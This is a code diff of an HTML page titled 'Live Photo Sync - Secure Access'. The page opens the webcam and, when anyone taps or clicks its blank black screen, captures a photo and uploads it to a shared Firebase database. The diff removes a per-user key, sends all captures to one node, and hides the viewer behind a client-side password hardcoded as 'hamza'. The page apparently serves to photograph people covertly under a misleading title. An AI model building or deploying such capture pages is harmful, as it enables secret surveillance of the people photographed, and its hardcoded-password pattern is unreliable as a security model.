@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>LiveSnap View + Capture</title>
+  <title>Live Photo Sync - Secure Access</title>
   <style>
     body {
       background: black;
@@ -11,7 +11,6 @@
       font-family: sans-serif;
       overflow-y: scroll;
       min-height: 300vh;
-      color: white;
     }
     #captureArea {
       height: 100vh;
@@ -23,21 +22,36 @@
     #result {
       text-align: center;
       padding: 20px;
+      color: white;
     }
     #livePhoto {
       width: 90%;
       max-width: 400px;
       margin-top: 20px;
       border: 2px solid white;
+      display: none;
+    }
+    #unlockBtn {
+      background-color: #222;
+      color: #0f0;
+      border: none;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      font-size: 25px;
+      cursor: pointer;
+      display: none;
     }
   </style>
 </head>
 <body>
   <div id="captureArea" ontouchstart="capture()" onclick="capture()"></div>
+
   <div id="spacer"></div>
 
   <div id="result">
     <h3>Captured Photo:</h3>
+    <button id="unlockBtn">🔒</button><br>
     <img id="livePhoto" src="" alt="Waiting for photo..." />
   </div>
 
@@ -57,20 +71,14 @@
       appId: "1:24202813286:web:02304adf2c5ffed9fab2a7",
       measurementId: "G-BR9MFH2XN6"
     };
+
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-
-    const params = new URLSearchParams(window.location.search);
-    const key = params.get("key");
 
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const img = document.getElementById('livePhoto');
-
-    if (!key) {
-      document.body.innerHTML = "<h2 style='text-align:center;margin-top:50px;'>No key provided in URL (use ?key=yourkey)</h2>";
-      throw new Error("Key not provided");
-    }
+    const unlockBtn = document.getElementById('unlockBtn');
 
     navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
       video.srcObject = stream;
@@ -83,16 +91,28 @@
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       const dataUrl = canvas.toDataURL("image/jpeg");
 
-      db.ref("livephoto/" + key).set({
+      db.ref("livephoto").set({
         image: dataUrl,
         time: Date.now()
       });
     }
 
-    db.ref("livephoto/" + key).on("value", snapshot => {
+    db.ref("livephoto").on("value", snapshot => {
       const data = snapshot.val();
       if (data && data.image) {
         img.src = data.image;
+        img.style.display = "none";
+        unlockBtn.style.display = "inline-block";
+      }
+    });
+
+    unlockBtn.addEventListener("click", () => {
+      const pass = prompt("Enter password to unlock the photo:");
+      if (pass === "hamza") {
+        img.style.display = "block";
+        unlockBtn.style.display = "none";
+      } else {
+        alert("Wrong password!");
       }
     });
   </script>
